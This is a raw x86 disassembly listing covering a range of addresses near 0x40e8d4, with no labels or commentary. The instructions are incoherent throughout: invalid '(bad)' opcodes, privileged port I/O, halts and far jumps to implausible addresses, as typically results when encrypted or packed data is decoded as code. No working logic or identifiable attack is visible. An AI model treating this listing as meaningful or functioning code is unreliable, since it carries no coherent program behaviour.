  40e8d4:	dec    edx
  40e8d5:	dec    esp
  40e8d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8d7:	push   esp
  40e8d8:	xor    eax,0xf2f03e83
  40e8dd:	sbb    dl,BYTE PTR [edx]
  40e8df:	xor    al,0xc6
  40e8e1:	sbb    DWORD PTR [esi-0x59],ebp
  40e8e4:	and    bh,ah
  40e8e6:	fwait
  40e8e7:	out    dx,al
  40e8e8:	call   0x7e67d199
  40e8ed:	jl     0x40e896
  40e8ef:	sar    BYTE PTR [edi-0x67d03b65],cl
  40e8f5:	push   es
  40e8f6:	scas   eax,DWORD PTR es:[edi]
  40e8f7:	fcmovnbe st,st(4)
  40e8f9:	rcl    edx,1
  40e8fb:	sar    BYTE PTR [ebx+0x3f],0xf3
  40e8ff:	(bad)  
  40e900:	xchg   esp,eax
  40e901:	xor    BYTE PTR [esi],dl
  40e903:	jecxz  0x40e8ab
  40e905:	xor    eax,0x69244444
  40e90a:	outs   dx,DWORD PTR ds:[esi]
  40e90b:	mov    eax,ecx
  40e90d:	(bad)  
  40e90f:	imul   ebx,DWORD PTR [ecx+0x12],0x44
  40e913:	inc    ebp
  40e914:	pusha  
  40e915:	not    DWORD PTR [eax-0x6b]
  40e918:	push   0x50
  40e91a:	mov    bl,0xad
  40e91c:	dec    DWORD PTR [ecx-0x7749b8b8]
  40e922:	push   ebp
  40e923:	push   0xffffffb0
  40e925:	aam    0x1f
  40e927:	jae    0x40e939
  40e929:	into   
  40e92a:	outs   dx,BYTE PTR ds:[esi]
  40e92b:	push   0x98c6a1cb
  40e930:	jle    0x40e8ee
  40e932:	jnp    0x40e8b8
  40e934:	lods   eax,DWORD PTR ds:[esi]
  40e935:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e936:	inc    ecx
  40e937:	or     bh,BYTE PTR [edx]
  40e939:	aam    0x97
  40e93b:	adc    dh,0x9b
  40e93e:	ret    0xda4
  40e941:	inc    ebx
  40e942:	daa    
  40e943:	je     0x40e971
  40e945:	outs   dx,BYTE PTR ds:[esi]
  40e946:	stos   DWORD PTR es:[edi],eax
  40e947:	jmp    0xb4ee3e3a
  40e94c:	pusha  
  40e94d:	mov    edx,esp
  40e94f:	push   esi
  40e950:	push   0x13
  40e952:	int3   
  40e953:	ficomp WORD PTR [ecx]
  40e955:	fsubr  DWORD PTR [edx-0xd6115ba]
  40e95b:	xchg   BYTE PTR [esi],dl
  40e95d:	fs push ebx
  40e95f:	push   edi
  40e960:	shr    BYTE PTR ss:[edi],1
  40e963:	hlt    
  40e964:	mov    edi,DWORD PTR [eax+0x1d5d6f6a]
  40e96a:	cmp    BYTE PTR [ebp-0x42d7816e],dh
  40e970:	fmul   DWORD PTR [edx+0x61]
  40e973:	xchg   ecx,eax
  40e974:	stos   DWORD PTR es:[edi],eax
  40e975:	fwait
  40e976:	es dec edi
  40e978:	xor    eax,DWORD PTR [ecx+0x17d784db]
  40e97e:	jp     0x40e90f
  40e980:	pop    esp
  40e981:	pop    ss
  40e982:	add    dh,BYTE PTR [edx-0x354c10a6]
  40e988:	push   ds
  40e989:	repz or al,0x53
  40e98c:	mov    cl,0x2c
  40e98e:	adc    bh,BYTE PTR [eax-0x1e]
  40e991:	fisub  DWORD PTR [edx]
  40e993:	imul   esp,ebp,0x708a5675
  40e999:	mov    esi,0x21214423
  40e99e:	popf   
  40e99f:	mov    eax,0x88313a15
  40e9a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9a5:	dec    ecx
  40e9a6:	mov    cl,0x77
  40e9a8:	mov    bh,0xe8
  40e9aa:	ja     0x40e934
  40e9ac:	shl    cl,cl
  40e9ae:	test   eax,0xc9027717
  40e9b3:	push   es
  40e9b4:	xchg   esi,eax
  40e9b5:	mov    ebp,0xaaa6fa69
  40e9ba:	das    
  40e9bb:	dec    edi
  40e9bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9bd:	mov    ds:0x9ea9cde9,eax
  40e9c2:	pop    ds
  40e9c3:	add    dl,ch
  40e9c5:	jnp    0x40e956
  40e9c7:	or     bl,0xb3
  40e9ca:	cmp    cl,BYTE PTR [ebx-0x7f]
  40e9cd:	aad    0x8d
  40e9cf:	and    bl,BYTE PTR [esi+esi*8-0x7207ad38]
  40e9d6:	or     BYTE PTR [edi],0x25
  40e9d9:	xchg   edx,eax
  40e9da:	in     al,dx
  40e9db:	sub    dh,cl
  40e9dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9de:	push   esp
  40e9df:	enter  0x2ad3,0xd4
  40e9e3:	je     0x40e977
  40e9e5:	jno    0x40ea2f
  40e9e7:	(bad)  
  40e9e8:	ja     0x40e999
  40e9ea:	jp     0x40ea49
  40e9ec:	xchg   DWORD PTR ds:0xe63ad10c,esi
  40e9f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9f3:	ins    BYTE PTR es:[edi],dx
  40e9f4:	inc    esp
  40e9f5:	xchg   ebx,eax
  40e9f6:	adc    al,0x79
  40e9f8:	inc    edi
  40e9f9:	add    al,0x78
  40e9fb:	fnstenv [ebx+0xe]
  40e9fe:	and    esi,DWORD PTR [ebx+0x1ef7c662]
  40ea04:	cli    
  40ea05:	mov    edx,0xb7851308
  40ea0a:	out    dx,eax
  40ea0b:	fist   DWORD PTR [eax+0x2c]
  40ea0e:	jecxz  0x40ea29
  40ea10:	les    ebp,FWORD PTR [edx+eiz*1-0x28103568]
  40ea17:	inc    DWORD PTR [edx-0x6f]
  40ea1a:	sub    ch,BYTE PTR [ebp+0x4f65d1ec]
  40ea20:	lods   al,BYTE PTR ds:[esi]
  40ea21:	cmp    esp,DWORD PTR [ebp+0xc80da9c]
  40ea27:	ret    0xb12e
  40ea2a:	dec    ebp
  40ea2b:	sbb    al,BYTE PTR [ebx-0x29]
  40ea2e:	push   ds
  40ea2f:	(bad)  
  40ea30:	xlat   BYTE PTR ds:[ebx]
  40ea31:	(bad)  
  40ea33:	xor    BYTE PTR [ebx-0x43c3103c],dh
  40ea39:	or     al,0x84
  40ea3b:	sbb    eax,0x677a902c
  40ea40:	sbb    eax,0x234e43d8
  40ea45:	in     eax,dx
  40ea46:	clc    
  40ea47:	mov    edx,0x1ae0750c
  40ea4c:	imul   ecx,ebx,0x41
  40ea4f:	cwde   
  40ea50:	xchg   ebp,eax
  40ea51:	rcr    BYTE PTR [esi-0x47],1
  40ea54:	lods   al,BYTE PTR ds:[esi]
  40ea55:	xchg   DWORD PTR [eax],ebx
  40ea57:	cmp    ebp,DWORD PTR [ebp+eax*4+0x46]
  40ea5b:	fsub   QWORD PTR [edi+0x59332e03]
  40ea61:	cmp    eax,DWORD PTR [ebp+0x36]
  40ea64:	hlt    
  40ea65:	dec    esi
  40ea66:	xchg   esi,eax
  40ea67:	mov    dl,0xf1
  40ea69:	cli    
  40ea6a:	scas   al,BYTE PTR es:[edi]
  40ea6b:	sbb    eax,0xa62f3b43
  40ea70:	sub    eax,0x8f8c4c36
  40ea75:	pop    edx
  40ea76:	std    
  40ea77:	(bad)  
  40ea79:	ins    BYTE PTR es:[edi],dx
  40ea7a:	xchg   BYTE PTR [edi],cl
  40ea7c:	dec    eax
  40ea7d:	sub    WORD PTR [esi-0x4d9ccba],cx
  40ea84:	ds pop ebp
  40ea86:	sub    eax,0x9a580e61
  40ea8b:	mov    al,ds:0x34977b3a
  40ea90:	mov    dh,0x90
  40ea92:	lds    ebx,FWORD PTR [esi-0xc]
  40ea95:	in     eax,dx
  40ea96:	push   es
  40ea97:	sub    BYTE PTR [ebx+edx*8-0x135846f0],0x99
  40ea9f:	aaa    
  40eaa0:	jecxz  0x40eb09
  40eaa2:	jp     0x40eaca
  40eaa4:	mov    ch,0xc2
  40eaa6:	lods   al,BYTE PTR ds:[esi]
  40eaa7:	dec    ebp
  40eaa8:	cmp    ecx,DWORD PTR [ebx-0x1beb558c]
  40eaae:	and    dl,dh
  40eab0:	sub    ch,BYTE PTR [ebp-0x2e4ec1fd]
  40eab6:	jge    0x40ea64
  40eab8:	sti    
  40eab9:	repnz add eax,0xc6cbc0e0
  40eabf:	pop    ebp
  40eac0:	into   
  40eac1:	adc    al,0x8e
  40eac3:	into   
  40eac4:	dec    edx
  40eac5:	inc    esi
  40eac6:	cdq    
  40eac7:	aas    
  40eac8:	xor    al,0xb7
  40eaca:	dec    edx
  40eacb:	pop    DWORD PTR [eax+0x74]
  40eace:	hlt    
  40eacf:	sub    DWORD PTR [ecx+0x1cb6fa72],eax
  40ead5:	sub    DWORD PTR [bp+si],ebp
  40ead8:	ds pop esp
  40eada:	aas    
  40eadb:	adc    bh,BYTE PTR [edx-0x224c4d37]
  40eae1:	mov    esi,0xe627d0e1
  40eae6:	popf   
  40eae7:	rol    DWORD PTR [ecx-0x4cc563a1],1
  40eaed:	mov    eax,ds:0xad1932d5
  40eaf2:	out    dx,eax
  40eaf3:	cmp    eax,0x309e8c80
  40eaf8:	mov    dh,0x2e
  40eafa:	jo     0x40eb77
  40eafc:	jg     0x40eaf0
  40eafe:	ret    0xe92b
  40eb01:	or     DWORD PTR [eax],esi
  40eb03:	lock jle 0x40eab0
  40eb06:	add    ebp,edi
  40eb08:	ins    DWORD PTR es:[edi],dx
  40eb09:	aaa    
  40eb0a:	pop    eax
  40eb0b:	inc    ebp
  40eb0c:	data16 clc 
  40eb0e:	push   cs
  40eb0f:	popf   
  40eb10:	es lock jp 0x40eb2c
  40eb14:	hlt    
  40eb15:	mov    ebp,0xde079b63
  40eb1a:	mov    ebx,0xefd736ba
  40eb1f:	jp     0x40eb70
  40eb21:	or     DWORD PTR [edi-0x45685609],0x971c1edd
  40eb2b:	push   ecx
  40eb2c:	add    al,0xec
  40eb2e:	xchg   esp,eax
  40eb2f:	and    DWORD PTR [edx+0x5f8f8686],edx
  40eb35:	and    edi,edx
  40eb37:	cs inc esi
  40eb39:	push   ds
  40eb3a:	stc    
  40eb3b:	jns    0x40ead9
  40eb3d:	cmp    eax,DWORD PTR [ebp+ebx*2-0x72818419]
  40eb44:	xor    al,0x38
  40eb46:	ins    DWORD PTR es:[edi],dx
  40eb47:	(bad)  
  40eb48:	xchg   edi,eax
  40eb49:	mov    ebp,0xa92c2e1
  40eb4e:	add    BYTE PTR [ebp+0x43],ch
  40eb51:	hlt    
  40eb52:	retf   0xa70c
  40eb55:	jmp    0xa746517e
  40eb5a:	fdivp  st(1),st
  40eb5c:	add    eax,0x49e289aa
  40eb61:	rol    DWORD PTR [ecx-0x7ec06597],1
  40eb67:	loope  0x40eb36
  40eb69:	fldcw  WORD PTR [ebp-0x4f]
  40eb6c:	jo     0x40eb79
  40eb6e:	inc    ebp
  40eb6f:	xchg   ebp,esp
  40eb71:	jge    0x40eb35
  40eb73:	mov    cl,0x11
  40eb75:	add    DWORD PTR [edx],edi
  40eb77:	cmp    al,0x71
  40eb79:	sub    al,dl
  40eb7b:	fisttp DWORD PTR [ebx]
  40eb7d:	mov    ebp,0x59fc752b
  40eb82:	ret    
  40eb83:	enter  0xe10a,0xf5
  40eb87:	test   DWORD PTR [ebx],esi
  40eb89:	test   BYTE PTR [edx-0x13],al
  40eb8c:	sub    BYTE PTR [esi],bh
  40eb8e:	emms   
  40eb90:	fs fs stos DWORD PTR es:[edi],eax
  40eb93:	clc    
  40eb94:	mov    dh,0x62
  40eb96:	jmp    0x6e05:0xfa9f6c18
  40eb9d:	loopne 0x40eb6b
  40eb9f:	stc    
  40eba0:	int    0xc
  40eba2:	pop    ebx
  40eba3:	fdivr  QWORD PTR [ebp-0x7d9950c9]
  40eba9:	fwait
  40ebaa:	data16 aad 0x9
  40ebad:	xor    DWORD PTR [ebx+0x59f1e82f],ebx
  40ebb3:	jnp    0x40ebb4
  40ebb5:	cmp    DWORD PTR [ecx-0x61ee7bde],eax
  40ebbb:	push   ds
  40ebbc:	out    dx,al
  40ebbd:	loope  0x40eb9d
  40ebbf:	pop    ds
  40ebc0:	(bad)  ds:0xe09840c1
  40ebc6:	out    dx,eax
  40ebc7:	jle    0x40ebe7
  40ebc9:	or     bh,BYTE PTR [esi+0x6dce2c94]
  40ebcf:	les    ebp,FWORD PTR [esi-0x4ab36f9e]
  40ebd5:	stc    
  40ebd6:	push   esi
  40ebd7:	leave  
  40ebd8:	sar    DWORD PTR [ecx],cl
  40ebda:	test   eax,0x554006a4
  40ebdf:	mov    DWORD PTR [ecx],edx
  40ebe1:	idiv   ah
  40ebe3:	xor    al,0x89
  40ebe5:	daa    
  40ebe6:	lods   eax,DWORD PTR ds:[esi]
  40ebe7:	push   esi
  40ebe8:	pop    ebp
  40ebe9:	and    DWORD PTR [eax+0x12],ebx
  40ebec:	mov    esp,0xbca0154a
  40ebf1:	aam    0x2d
  40ebf3:	adc    bl,BYTE PTR [ecx-0x1d]
  40ebf6:	scas   al,BYTE PTR es:[edi]
  40ebf7:	mov    DWORD PTR [eax-0x7cf18e96],ebx
  40ebfd:	mov    dh,0xa
  40ebff:	aaa    
  40ec00:	arpl   WORD PTR [eax+esi*4],sp
  40ec03:	push   esp
  40ec04:	ins    DWORD PTR es:[edi],dx
  40ec05:	push   ebp
  40ec06:	out    dx,eax
  40ec07:	nop
  40ec08:	(bad)  
  40ec0a:	jb     0x40ec79
  40ec0c:	dec    ecx
  40ec0d:	loopne 0x40eb98
  40ec0f:	jmp    DWORD PTR [esi-0x12dfe49e]
  40ec15:	sbb    bh,bl
  40ec17:	and    eax,0x28c03b34
  40ec1c:	adc    eax,ebp
  40ec1e:	xor    cl,bl
  40ec20:	mov    ?,WORD PTR [edi+eiz*1+0x23]
  40ec24:	xchg   edx,eax
  40ec25:	ret    0xb6f2
  40ec28:	repnz xchg edi,eax
  40ec2a:	call   0x684cef1e
  40ec2f:	push   0xffffff8d
  40ec31:	ficom  WORD PTR [esi-0x5a]
  40ec34:	mov    al,BYTE PTR [ebp+0x42e30a7]
  40ec3a:	hlt    
  40ec3b:	inc    edx
  40ec3c:	add    edi,esp
  40ec3e:	dec    eax
  40ec3f:	and    al,0xb4
  40ec41:	inc    esp
  40ec42:	mov    gs,WORD PTR [edi]
  40ec44:	ja     0x40eca4
  40ec46:	inc    eax
  40ec47:	repz pop esi
  40ec49:	pop    edx
  40ec4a:	xlat   BYTE PTR ds:[ebx]
  40ec4b:	xchg   edi,eax
  40ec4c:	pop    esp
  40ec4d:	mov    cl,0xaa
  40ec4f:	(bad)
  40ec53:	pop    ebx
  40ec54:	bound  ebp,QWORD PTR [eax-0x49]
  40ec57:	pop    eax
  40ec58:	cwde   
  40ec59:	test   DWORD PTR [ecx],esi
  40ec5b:	or     dl,cl
  40ec5d:	add    cl,BYTE PTR [edi+eiz*2-0x2c]
  40ec61:	inc    esi
  40ec62:	jo     0x40ebe6
  40ec64:	mov    BYTE PTR [ebx+0x6a],ah
  40ec67:	imul   ecx,DWORD PTR [ecx],0x9b94c80d
  40ec6d:	xlat   BYTE PTR ds:[ebx]
  40ec6e:	add    BYTE PTR [edi],dh
  40ec70:	push   es
  40ec71:	and    dh,ch
  40ec73:	dec    esi
  40ec74:	adc    ah,dl
  40ec76:	and    ch,BYTE PTR ds:0x1fb98547
  40ec7c:	lods   eax,DWORD PTR ds:[esi]
  40ec7d:	add    BYTE PTR [ebx-0x3a34233b],0xbd
  40ec84:	add    bl,0xdf
  40ec87:	jmp    0xa129d28e
  40ec8c:	push   es
  40ec8d:	push   esi
  40ec8e:	pop    es
  40ec8f:	dec    edx
  40ec90:	and    edx,DWORD PTR ds:0x80742a93
  40ec96:	data16 mov ah,0xda
  40ec99:	add    al,0x4c
  40ec9b:	mov    al,BYTE PTR [esi]
  40ec9d:	sub    DWORD PTR [esi+edi*1],0x49
  40eca1:	neg    BYTE PTR [ebx]
  40eca3:	cmp    BYTE PTR [edx-0x565b5e15],dh
  40eca9:	pop    esp
  40ecaa:	retf   0x6234
  40ecad:	xor    esp,DWORD PTR [ebx]
  40ecaf:	(bad)  
  40ecb0:	in     al,0xd4
  40ecb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecb3:	in     eax,dx
  40ecb4:	(bad)  
  40ecb6:	fldcw  WORD PTR [edi]
  40ecb8:	test   al,0x61
  40ecba:	jp     0x40ec40
  40ecbc:	leave  
  40ecbd:	cld    
  40ecbe:	arpl   WORD PTR [edi+0x72],bp
  40ecc1:	xchg   esi,eax
  40ecc2:	cmp    al,0xbb
  40ecc4:	add    bl,BYTE PTR [edx+0x12302622]
  40ecca:	xchg   edx,eax
  40eccb:	cmp    eax,0x8f7969f4
  40ecd0:	int    0xef
  40ecd2:	push   edx
  40ecd3:	dec    esi
  40ecd4:	jecxz  0x40ecf1
  40ecd6:	addr16 jns 0x40ecd7
  40ecd9:	or     al,0xa
  40ecdb:	sub    dh,BYTE PTR [eax-0x56ac2c9c]
  40ece1:	aas    
  40ece2:	fsubr  DWORD PTR gs:[esp+edi*8+0x7d9a8d6e]
  40ecea:	out    0xed,al
  40ecec:	dec    edx
  40eced:	mov    ah,0x1
  40ecef:	xchg   ecx,eax
  40ecf0:	stc    
  40ecf1:	pop    edx
  40ecf2:	mov    ebp,0xe63074dd
  40ecf7:	and    eax,0xd9d883d6
  40ecfc:	out    0xdf,eax
  40ecfe:	call   0xe3f1:0xd20bbd47
  40ed05:	and    BYTE PTR [edx-0x528724dd],0x8
  40ed0c:	stos   BYTE PTR es:[edi],al
  40ed0d:	mov    BYTE PTR [ecx-0x60],al
  40ed10:	sti    
  40ed11:	push   edx
  40ed12:	mov    WORD PTR [ebx-0x7f],?
  40ed15:	rcr    DWORD PTR [ecx-0x2],0x33
  40ed19:	and    eax,0xcd26eb31
  40ed1e:	push   eax
  40ed1f:	in     eax,0xd5
  40ed21:	loope  0x40ed13
  40ed23:	sub    al,0xad
  40ed25:	jmp    0xddef:0x58081b02
  40ed2c:	jge    0x40ed7c
  40ed2e:	sub    al,al
  40ed30:	mov    ebp,0x55d703d1
  40ed35:	cdq    
  40ed36:	stos   BYTE PTR es:[edi],al
  40ed37:	cmp    BYTE PTR [ebx+edi*1+0x27],0xf1
  40ed3c:	adc    DWORD PTR [eax+0x27],eax
  40ed3f:	and    dl,0x75
  40ed42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed43:	hlt    
  40ed44:	push   0x5d
  40ed46:	cmp    eax,0xf655f3bc
  40ed4b:	call   0xee425e1e
  40ed50:	mov    edx,DWORD PTR [eax+0x10]
  40ed53:	scas   al,BYTE PTR es:[edi]
  40ed54:	xchg   esp,eax
  40ed55:	cs and al,0x9b
  40ed58:	call   0x44ee:0x724824
  40ed5f:	shl    cl,0x24
  40ed62:	jbe    0x40eda7
  40ed64:	psllq  mm1,QWORD PTR [edi]
  40ed67:	loop   0x40ecf6
  40ed69:	imul   ebp,DWORD PTR [ecx-0x1c],0x6f86966c
  40ed70:	xor    BYTE PTR [esi+0x39],ch
  40ed73:	adc    ecx,DWORD PTR [edi+0x2c8e7bb0]
  40ed79:	mov    ebx,0x76decc05
  40ed7e:	hlt    
  40ed7f:	sahf   
  40ed80:	(bad)  [ecx+0x3f725a53]
  40ed86:	xor    BYTE PTR [eax+0x57],al
  40ed89:	int3   
  40ed8a:	cli    
  40ed8b:	cli    
  40ed8c:	sub    DWORD PTR [edx+0x2612db7f],edi
  40ed92:	adc    DWORD PTR [esp+esi*2-0x5db24bb9],esp
  40ed99:	mov    gs,WORD PTR [edi+0x365f52c5]
  40ed9f:	mov    dl,0xa8
  40eda1:	mov    bh,BYTE PTR [ebp+0x7b787fc2]
  40eda7:	dec    edi
  40eda8:	pop    ebp
  40eda9:	pop    es
  40edaa:	pop    edx
  40edab:	inc    ebx
  40edac:	retf   0x303
  40edaf:	pop    ebx
  40edb0:	sbb    BYTE PTR ds:0xdac3256,bl
  40edb6:	inc    edi
  40edb7:	dec    BYTE PTR [esi+ebx*4]
  40edba:	push   esi
  40edbb:	xchg   edi,eax
  40edbc:	jns    0x40ed61
  40edbe:	imul   ebx,DWORD PTR [ebx+0x75],0x883e282a
  40edc5:	inc    ecx
  40edc6:	sub    edi,DWORD PTR [eax+0x58105e70]
  40edcc:	fucomp st(0)
  40edce:	icebp  
  40edcf:	idiv   edi
  40edd1:	sub    ecx,DWORD PTR ds:0xd9b355ea
  40edd7:	sahf   
  40edd8:	call   0x1958:0x3c2c032
  40eddf:	and    al,0x5
  40ede1:	into   
  40ede2:	push   ebp
  40ede3:	jmp    DWORD PTR [ecx]
  40ede5:	push   ds
  40ede6:	cmp    ebx,esp
  40ede8:	stos   DWORD PTR es:[edi],eax
  40ede9:	mov    ch,0xd8
  40edeb:	daa    
  40edec:	cwde   
  40eded:	and    DWORD PTR [ebp+edx*4+0x14],0xa9ff7013
  40edf5:	xchg   edi,eax
  40edf6:	xor    al,0x4c
  40edf8:	les    esp,FWORD PTR [edi+0x4cab0524]
  40edfe:	push   ds
  40edff:	jb     0x40edcf
  40ee01:	shl    edi,0xd0
  40ee04:	test   DWORD PTR [esp+edi*4],ecx
  40ee07:	dec    eax
  40ee08:	fild   DWORD PTR [ebx-0x11]
  40ee0b:	scas   eax,DWORD PTR es:[edi]
  40ee0c:	xchg   ecx,eax
  40ee0d:	fstp   QWORD PTR [ecx+edi*4]
  40ee10:	jo     0x40ee25
  40ee12:	mov    ebp,0x3c067562
  40ee17:	pop    ebx
  40ee18:	lods   eax,DWORD PTR ds:[esi]
  40ee19:	xor    DWORD PTR [eax+0x24a7b781],edi
  40ee1f:	loop   0x40ee3b
  40ee21:	mov    dl,BYTE PTR [edx-0x412004b4]
  40ee27:	add    DWORD PTR [ebx-0x5f],esp
  40ee2a:	xor    esi,DWORD PTR [ebx+0x736fc2db]
  40ee30:	mov    cl,0x6a
  40ee32:	sbb    bh,BYTE PTR [eax-0xe]
  40ee35:	imul   ebp,eax,0x3bfbcf7a
  40ee3b:	test   BYTE PTR [edi+0x73],bl
  40ee3e:	jl     0x40edf1
  40ee40:	xor    ebx,ecx
  40ee42:	jecxz  0x40edf4
  40ee44:	xlat   BYTE PTR ds:[ebx]
  40ee45:	test   al,0xde
  40ee47:	stc    
  40ee48:	jb     0x40ee02
  40ee4a:	fucomip st,st(5)
  40ee4c:	es sub ebx,esi
  40ee4f:	sub    BYTE PTR [ebx+0x473069e7],cl
  40ee55:	dec    eax
  40ee56:	mov    BYTE PTR [ebx+edx*1-0x5b],ah
  40ee5a:	jge    0x40eebd
  40ee5c:	jmp    0xabd2:0x2d297bb4
  40ee63:	sub    dh,BYTE PTR [ebx+eax*8-0x3f4fd07c]
  40ee6a:	dec    edx
  40ee6b:	push   edx
  40ee6c:	retf   
  40ee6d:	mov    cl,0xb8
  40ee6f:	add    al,0x75
  40ee71:	cld    
  40ee72:	jns    0x40ee7d
  40ee74:	shl    BYTE PTR [ebp-0x552d1ab1],0x53
  40ee7b:	arpl   WORD PTR [ecx],bx
  40ee7d:	ffreep st(6)
  40ee7f:	fcomp  QWORD PTR ds:0x6a82d108
  40ee85:	or     BYTE PTR [ecx-0x1a],cl
  40ee88:	stos   BYTE PTR es:[edi],al
  40ee89:	imul   ebp,DWORD PTR [ebx-0x73],0x5b
  40ee8d:	xchg   DWORD PTR [ebp+0x5eecce59],esp
  40ee93:	out    dx,al
  40ee94:	sbb    DWORD PTR [eax],0x4d
  40ee97:	adc    bl,BYTE PTR [ebx]
  40ee99:	push   0x73
  40ee9b:	(bad)  
  40ee9c:	pop    edi
  40ee9d:	leave  
  40ee9e:	cs jo  0x40ee28
  40eea1:	jle    0x40ef0f
  40eea3:	dec    ebx
  40eea4:	mov    WORD PTR [esi+eiz*2-0x19],?
  40eea8:	int    0x6e
  40eeaa:	sbb    ebp,DWORD PTR [edx]
  40eeac:	in     eax,0xba
  40eeae:	mov    ecx,0x437bd854
  40eeb3:	xchg   ebx,eax
  40eeb4:	outs   dx,DWORD PTR ds:[esi]
  40eeb5:	hlt    
  40eeb6:	xchg   ebx,eax
  40eeb7:	cmc    
  40eeb8:	cmp    al,ah
  40eeba:	push   eax
  40eebb:	(bad)  
  40eebc:	retf   0x769b
  40eebf:	cmp    DWORD PTR [esi],eax
  40eec1:	or     ebp,DWORD PTR [ecx-0x74]
  40eec4:	(bad)  
  40eec6:	mov    dh,0x72
  40eec8:	jecxz  0x40ef06
  40eeca:	iret   
  40eecb:	test   eax,0x8c7f06eb
  40eed0:	gs nop
  40eed2:	stc    
  40eed3:	xchg   BYTE PTR [edi+eiz*8-0x37f2b157],bl
  40eeda:	cdq    
  40eedb:	(bad)  [ecx+0x40]
  40eede:	cli    
  40eedf:	mov    ds:0x24fbf482,eax
  40eee4:	sti    
  40eee5:	dec    ebx
  40eee6:	or     DWORD PTR [ebx],0xffffff93
  40eee9:	loope  0x40ee9b
  40eeeb:	cmp    eax,DWORD PTR [ecx]
  40eeed:	pop    esp
  40eeee:	out    dx,eax
  40eeef:	push   ecx
  40eef0:	popf   
  40eef1:	aaa    
  40eef2:	mov    ebp,0xc1b9ad6c
  40eef7:	sub    dh,cl
  40eef9:	pop    edx
  40eefa:	pushf  
  40eefb:	shl    DWORD PTR [ebp+eax*2-0xb6ecc84],1
  40ef02:	mul    DWORD PTR [eax]
  40ef04:	and    bh,BYTE PTR [ebx+0x58]
  40ef07:	sub    edi,edx
  40ef09:	pop    ebx
  40ef0a:	jmp    0xabc7702
  40ef0f:	js     0x40ef28
  40ef11:	jbe    0x40eecd
  40ef13:	sub    DWORD PTR [esi+0x79],0xfc4489b1
  40ef1a:	jmp    0x9a6709b3
  40ef1f:	xchg   esi,eax
  40ef20:	xor    esi,DWORD PTR [eax-0x6e168cb4]
  40ef26:	adc    DWORD PTR [esp+ecx*4-0x935293a],esp
  40ef2d:	cmc    
  40ef2e:	fwait
  40ef2f:	xchg   BYTE PTR [edi+0xc],ah
  40ef32:	fmul   QWORD PTR [esi+0x750ae37d]
  40ef38:	push   eax
  40ef39:	mov    bh,0xef
  40ef3b:	(bad)  
  40ef3c:	out    dx,eax
  40ef3d:	jo     0x40ef6a
  40ef3f:	push   esi
  40ef40:	sub    dl,bh
  40ef42:	sbb    DWORD PTR [ebx-0x43],esi
  40ef45:	jmp    esp
  40ef47:	inc    ebx
  40ef48:	lods   eax,DWORD PTR ds:[esi]
  40ef49:	inc    edx
  40ef4a:	jmp    0x1734:0xf8ba8f64
  40ef51:	cmp    dl,BYTE PTR [ecx-0x6542fedd]
  40ef57:	jmp    0x5b5f:0xd45312fd
  40ef5e:	ins    BYTE PTR es:[edi],dx
  40ef5f:	addr16 mov dl,0xc5
  40ef62:	xor    BYTE PTR [edi-0x4aef64fc],ah
  40ef68:	xchg   edx,eax
  40ef69:	push   0xdfa18f8f
  40ef6e:	add    eax,0x8fcec836
  40ef73:	and    DWORD PTR [ebx-0x20],ebp
  40ef76:	xor    eax,0x1b79608c
  40ef7b:	pop    ecx
  40ef7c:	fnsave ss:[ebx]
  40ef7f:	int    0x7f
  40ef81:	sub    dl,bh
  40ef83:	and    eax,0xa289c020
  40ef88:	mov    DWORD PTR [ecx-0x122be380],eax
  40ef8e:	or     ax,0x3289
  40ef92:	mov    al,ds:0x6f5dda27
  40ef97:	daa    
  40ef98:	(bad)  
  40ef9a:	cmp    DWORD PTR [ebx+eiz*1+0x17365415],esi
  40efa1:	jmp    0x40ef3d
  40efa3:	xchg   ecx,eax
  40efa4:	inc    eax
  40efa5:	push   ebp
  40efa6:	push   ecx
  40efa7:	retf   0x2495
  40efaa:	jmp    0x9fc:0xcfd86db7
  40efb1:	dec    ebp
  40efb2:	dec    edi
  40efb3:	adc    BYTE PTR [eax+edx*2+0x3e77d2c3],al
  40efba:	mov    al,ds:0x6af3cd4f
  40efbf:	loope  0x40ef69
  40efc1:	outs   dx,BYTE PTR ds:[esi]
  40efc2:	or     DWORD PTR ds:0x9be32263,esi
  40efc8:	pop    eax
  40efc9:	mov    bl,0xe2
  40efcb:	outs   dx,DWORD PTR ds:[esi]
  40efcc:	daa    
  40efcd:	push   es
  40efce:	popa   
  40efcf:	cdq    
  40efd0:	ret    
  40efd1:	cmp    esi,esp
  40efd3:	sub    edi,DWORD PTR [ebx+0x39]
  40efd6:	daa    
  40efd7:	ins    DWORD PTR es:[edi],dx
  40efd8:	jl     0x40efe4
  40efda:	add    DWORD PTR [edi],ebp
  40efdc:	outs   dx,BYTE PTR ds:[esi]
  40efdd:	add    BYTE PTR ss:[edx+0x25],bl
  40efe1:	aaa    
  40efe2:	cdq    
  40efe3:	sub    esp,DWORD PTR [eax+ebx*1+0x26]
  40efe7:	pop    ebp
  40efe8:	mov    edi,0x27c17dea
  40efed:	nop
  40efee:	or     eax,0xa024b95b
  40eff3:	mov    ds:0xf23214ef,al
  40eff8:	or     DWORD PTR [edx],esp
  40effa:	ret    
  40effb:	aad    0xf7
  40effd:	test   al,0xe3
  40efff:	push   esp
  40f000:	fs pushf 
  40f002:	inc    edx
  40f003:	out    0x9d,al
  40f005:	outs   dx,DWORD PTR ds:[esi]
  40f006:	jnp    0x40efc1
  40f008:	hlt    
  40f009:	dec    eax
  40f00a:	xchg   edi,eax
  40f00b:	test   DWORD PTR [ebp*8-0xd46e15c],eax
  40f012:	retf   
  40f013:	loop   0x40efef
  40f015:	inc    esi
  40f016:	clc    
  40f017:	add    ah,BYTE PTR [esi]
  40f019:	dec    edx
  40f01a:	pop    ecx
  40f01b:	jp     0x40f005
  40f01d:	jge    0x40efe2
  40f01f:	push   eax
  40f020:	pop    eax
  40f021:	hlt    
  40f022:	pusha  
  40f023:	dec    ecx
  40f024:	dec    edi
  40f025:	dec    DWORD PTR [ecx+0x2d]
  40f028:	leave  
  40f029:	jmp    0x40efe7
  40f02b:	ror    BYTE PTR [ebx],0xaa
